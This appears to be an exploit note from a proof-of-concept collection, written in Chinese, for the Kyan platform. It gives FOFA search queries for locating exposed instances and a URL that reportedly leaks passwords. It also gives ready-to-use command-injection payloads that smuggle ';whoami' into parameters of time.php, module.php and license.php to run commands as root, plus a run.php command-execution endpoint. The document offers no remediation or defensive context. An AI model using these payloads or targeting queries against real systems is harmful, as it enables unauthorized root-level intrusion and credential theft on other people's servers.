# Kyan 密码泄露/远程命令执行

## 漏洞描述

Kyan系统存在密码泄露/多个远程命令执行漏洞，攻击者通过漏洞可以获取服务器权限。

## 指纹

`fofa: title=="platform - Login""`

`fofa: "login_files/button_login_to_bluesky.png"`

## 漏洞验证

### 密码泄露

访问 **`http:{url}/hosts`**

### 命令执行

**均需要登录权限**

1.访问time.php

**root权限**

```
POST /time.php HTTP/1.1
Host: {host}
User-Agent: Mozilla/5.0 (Android 11; Mobile; rv:83.0) Gecko/83.0 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 25
Cookie: PHPSESSID=290963l2ba178deq1suilpcub2; SpryMedia_DataTables_filesystemTable_status.php=%7B%22iStart%22%3A%200%2C%22iEnd%22%3A%204%2C%22iLength%22%3A%2010%2C%22sFilter%22%3A%20%22%22%2C%22sFilterEsc%22%3A%20true%2C%22aaSorting%22%3A%20%5B%20%5B0%2C'asc'%5D%5D%2C%22aaSearchCols%22%3A%20%5B%20%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%2C%5B''%2Ctrue%5D%5D%2C%22abVisCols%22%3A%20%5B%20true%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%2Ctrue%5D%7D; MemoryTree=1
Upgrade-Insecure-Requests: 1

timesynctype=;whoami
```

2.访问module.php

**root权限**

```http://{url}/module.php?cmd=delete&name=;whoami```

3.访问license.php

**root权限**

```http://{url}/license.php?cmd=delete&name=;whoami```

4.访问run.php

**apache权限**

```http://{url}/run.php```

![图片](./images/640.png)
